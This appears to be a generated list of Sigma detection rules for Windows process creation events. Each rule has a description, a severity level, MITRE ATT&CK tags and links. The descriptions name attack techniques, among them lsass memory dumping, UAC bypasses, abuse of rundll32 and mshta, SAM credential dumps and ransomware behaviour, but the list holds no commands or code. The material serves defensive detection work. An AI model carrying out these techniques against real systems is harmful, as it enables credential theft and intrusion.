    Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lsass_dump.yml
* https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html

* https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md

    
### Suspicious Copy From or To System32
    
    Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_copy_system32.yml
* https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120

    
### Wsreset UAC Bypass
    
    Detects a method that uses Wsreset.exe tool that can be used to reset the Windows Store to bypass UAC

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wsreset_uac_bypass.yml
* https://lolbas-project.github.io/lolbas/Binaries/Wsreset/

* https://www.activecyber.us/activelabs/windows-uac-bypass

* https://twitter.com/ReaQta/status/1222548288731217921

    
### Suspicious Rundll32 Script in CommandLine
    
    Detects suspicious process related to rundll32 based on arguments

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_script_run.yml
* https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md

    
### Windows Hacktool Imphash
    
    Detects the use of Windows hacktools based on their import hash (imphash) even if the files have been renamed

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hacktool_imphashes.yml
* Internal Research

    
### Fireball Archer Install
    
    Detects Archer malware invocation via rundll32

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_crime_fireball.yml
* https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/

* https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100

    
### Execution via CL_Mutexverifiers.ps1
    
    Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cl_mutexverifiers_lolscript.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml

* https://twitter.com/pabraeken/status/995111125447577600

    
### SquiblyTwo
    
    Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1047
    * MITRE: attack.t1220
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_bypass_squiblytwo.yml
* https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html

* https://twitter.com/mattifestation/status/986280382042595328

    
### PowerShell Get-Process LSASS
    
    Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_getprocess_lsass.yml
* https://twitter.com/PythonResponder/status/1385064506049630211

    
### Windows Shell Spawning Suspicious Program
    
    Detects a suspicious child process of a Windows shell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.001
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_shell_spawn_susp_program.yml
* https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

    
### PowerShell Download from URL
    
    Detects a Powershell process that contains download commands in its command line string

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_download.yml
    
### Execution of Suspicious File Type Extension
    
    Checks whether the image specified in a process creation event doesn't refer to an .exe file (caused by process ghosting or other unorthodox methods to start a process)

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_non_exe_image.yml
* https://pentestlaboratories.com/2021/12/08/process-ghosting/

    
### Suspicious Service DACL Modification
    
    Detects suspicious DACL modifications that can  be used to hide services or make them unstopable

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_service_dacl_modification.yml
* https://www.sans.org/blog/red-team-tactics-hiding-windows-services/

* https://docs.microsoft.com/pt-br/windows/win32/secauthz/sid-strings

    
### RedMimicry Winnti Playbook Execute
    
    Detects actions caused by the RedMimicry Winnti playbook

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1106
    * MITRE: attack.t1059.003
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_redmimicry_winnti_proc.yml
* https://redmimicry.com

    
### CMSTP UAC Bypass via COM Object Access
    
    Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: attack.t1218.003
    * MITRE: attack.g0069
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmstp_com_object_access.yml
* https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/

* https://twitter.com/hFireF0X/status/897640081053364225

* https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf

* https://github.com/hfiref0x/UACME

    
### Monitoring Wuauclt.exe For Lolbas Execution Of DLL
    
    Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_execution_of_wuauclt.yml
* https://dtm.uk/wuauclt/

    
### Conti Volume Shadow Listing
    
    Detects a command used by conti to find volume shadow backups

    * Level: high
    * MITRE: attack.t1587.001
    * MITRE: attack.resource_development
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_conti.yml
* https://twitter.com/vxunderground/status/1423336151860002816?s=20

* https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection

    
### UAC Bypass via Event Viewer
    
    Detects UAC bypass method using Windows event viewer

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sysmon_uac_bypass_eventvwr.yml
* https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

* https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100

    
### Winrar Compressing Dump Files
    
    Detects a suspicious winrar execution that involves a file with a .dmp extension, which could be a step in a process of dump file exfiltration

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_winrar_dmp.yml
* https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/

    
### Application Whitelisting Bypass via Dnx.exe
    
    Execute C# code located in the consoleapp folder

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1027.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_dnx.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml

* https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/

    
### Suspicious Execution of Adidnsdump
    
    This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,
Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_adidnsdump.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump

    
### PrintBrm ZIP Creation of Extraction
    
    Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml
* https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/

    
### Detected Windows Software Discovery
    
    Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1518
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_software_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md

* https://github.com/harleyQu1nn/AggressorScripts

    
### Judgement Panda Credential Access Activity
    
    Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_bear_activity_gtr19.yml
* https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/

    
### Suspicious Tasklist Discovery Command
    
    Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1057
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_tasklist_command.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md#atomic-test-2---process-discovery---tasklist

    
### Adwind RAT / JRAT
    
    Detects javaw.exe in AppData folder as used by Adwind / JRAT

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_adwind.yml
* https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100

* https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf

    
### Wmic Uninstall Security Product
    
    Detects deinstallation of security products using WMIC utility

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wmic_security_product_uninstall.yml
* https://twitter.com/cglyer/status/1355171195654709249

* https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/

    
### Suspicious Dump64.exe Execution
    
    Detects when a user bypasses Defender by renaming a tool to dump64.exe and placing it in a Visual Studio folder

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_win_lolbas_dump64.yml
* https://twitter.com/mrd0x/status/1460597833917251595

    
### Use of CLIP
    
    Adversaries may collect data stored in the clipboard from users copying information within or between applications.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1115
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_clip.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/clip

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.md

    
### Mshta JavaScript Execution
    
    Identifies suspicious mshta.exe commands.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
* https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md

    
### GALLIUM Artefacts
    
    Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_gallium_sha1.yml
* https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/

* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)

    
### Suspicious Add User to Remote Desktop Users Group
    
    Detects suspicious command line in which a user gets added to the local Remote Desktop Users group

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1133
    * MITRE: attack.t1136.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_add_user_remote_desktop.yml
* https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/

    
### Suspicious DumpMinitool Usage
    
    Detects suspicious ways to use of a Visual Studio bundled tool named DumpMinitool.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proc_dump_susp_dumpminitool.yml
* https://twitter.com/mrd0x/status/1511415432888131586

* https://twitter.com/mrd0x/status/1511489821247684615

    
### Suspicious Process Parents
    
    Detects suspicious parent processes that should not have any children or should only have a single possible child program

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_parents.yml
* https://twitter.com/x86matthew/status/1505476263464607744?s=12

* https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b

    
### Local Accounts Discovery
    
    Local accounts, System Owner/User discovery using operating systems utilities

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    * MITRE: attack.t1087.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_local_system_owner_account_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md

    
### Redirect Output in CommandLine
    
    Use ">" to redicrect information in commandline

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmd_redirect.yml
* https://ss64.com/nt/syntax-redirection.html

    
### Network Sniffing
    
    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

    * Level: low
    * MITRE: attack.credential_access
    * MITRE: attack.discovery
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_network_sniffing.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md

    
### Possible Applocker Bypass
    
    Detects execution of executables that can be used to bypass Applocker whitelisting

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.004
    * MITRE: attack.t1218.009
    * MITRE: attack.t1127.001
    * MITRE: attack.t1218.005
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_possible_applocker_bypass.yml
* https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt

* https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md

    
### Suspicious XOR Encoded PowerShell Command Line
    
    Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1059.001
    * MITRE: attack.t1140
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_xor_commandline.yml
    
### Registry Dump of SAM Creds and Secrets
    
    Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_dump_sam.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-1---registry-dump-of-sam-creds-and-secrets

    
### TA505 Dropper Load Pattern
    
    Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.g0092
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_ta505_dropper.yml
* https://twitter.com/ForensicITGuy/status/1334734244120309760

    
### Copy from Admin Share
    
    Detects a suspicious copy command to or from an Admin share

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.collection
    * MITRE: attack.exfiltration
    * MITRE: attack.t1039
    * MITRE: attack.t1048
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_copy_lateral_movement.yml
* https://twitter.com/SBousseaden/status/1211636381086339073

* https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view

    
### Monitoring Winget For LOLbin Execution
    
    Adversaries can abuse winget to download payloads remotely and execute them without touching disk. Winget will be included by default in Windows 10 and is already available in Windows 10 insider programs. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe's, msi, msix files later.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_execution_via_winget.yml
* https://docs.microsoft.com/en-us/windows/package-manager/winget/install#local-install

    
### Suspicious Use of CSharp Interactive Console
    
    Detects the execution of CSharp interactive console by PowerShell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_use_of_csharp_console.yml
* https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/

    
### Emotet RunDLL32 Process Creation
    
    Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_emotet_rundll32_execution.yml
* https://paste.cryptolaemus.com/emotet/2020/12/22/emotet-malware-IoCs_12-22-20.html

* https://cyber.wtf/2021/11/15/guess-whos-back/

    
### Suspicious Extexport Execution
    
    Extexport.exe loads dll and is execute from other folder the original path

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_extexport.yml
* https://lolbas-project.github.io/lolbas/Binaries/Extexport/

    
### Psexec Accepteula Condition
    
    Detect ed user accept agreement execution in psexec commandline

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1569
    * MITRE: attack.t1021
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_psexec_eula.yml
    
### Suspicious PowerShell IEX Execution Patterns
    
    Detects suspicious ways to run Invoke-Execution using IEX acronym

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_iex_patterns.yml
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2

    
### Parent in Public Folder Suspicious Process
    
    This rule detects suspicious processes with parent images located in the C:\Users\Public folder

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_public_folder_parent.yml
* https://redcanary.com/blog/blackbyte-ransomware/

    
### Maze Ransomware
    
    Detects specific process characteristics of Maze ransomware word document droppers

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_crime_maze_ransomware.yml
* https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html

* https://app.any.run/tasks/51e7185c-52d7-4efb-ac0d-e86340053473/

* https://app.any.run/tasks/65a79440-373a-4725-8d74-77db9f2abda4/

    
### Service ImagePath Change with Reg.exe
    
    Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.
Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.
Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_service_imagepath_change.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-2---service-imagepath-change-with-regexe

    
### Webshell Hacking Activity Patterns
    
    Detects certain parent child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    * MITRE: attack.t1018
    * MITRE: attack.t1033
    * MITRE: attack.t1087
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_webshell_hacking.yml
* https://youtu.be/7aemGhaE9ds?t=641

    
### Suspicious Msiexec Quiet Install
    
    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

    
### UAC Bypass Using IEInstal - Process
    
    Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_ieinstal.yml
* https://github.com/hfiref0x/UACME

    
### Sysprep on AppData Folder
    
    Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_sysprep_appdata.yml
* https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets

* https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b

    
### Rundll32 InstallScreenSaver Execution
    
    An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver

    * Level: medium
    * MITRE: attack.t1218.011
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml
* https://lolbas-project.github.io/lolbas/Libraries/Desk/

    
### Rundll32 Without Parameters
    
    Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1570
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rundll32_without_parameters.yml
* https://bczyz1.github.io/2021/01/30/psexec.html

    
### Renamed MegaSync
    
    Detects the execution of a renamed meg.exe of MegaSync during incident response engagements associated with ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_megasync.yml
* https://redcanary.com/blog/rclone-mega-extortion/

    
### UAC Bypass Abusing Winsat Path Parsing - Process
    
    Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_winsat.yml
* https://github.com/hfiref0x/UACME

    
### Suspicious Shells Spawn by Java Utility Keytool
    
    Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_by_java_keytool.yml
* https://redcanary.com/blog/intelligence-insights-december-2021

* https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html

    
### WMI Remote Command Execution
    
    An adversary might use WMI to execute commands on a remote system

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmic_remote_command.yml
* https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic

    
### Capture Credentials with Rpcping.exe
    
    Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rpcping.yml
* https://lolbas-project.github.io/lolbas/Binaries/Rpcping/

* https://twitter.com/vysecurity/status/974806438316072960

* https://twitter.com/vysecurity/status/873181705024266241

* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875578(v=ws.11)

    
### Invoke-Obfuscation Via Use Rundll32
    
    Detects Obfuscated Powershell via use Rundll32 in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_rundll32.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Diantz Alternate Data Stream Execution
    
    Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_diantz_ads.yml
* https://lolbas-project.github.io/lolbas/Binaries/Diantz/

    
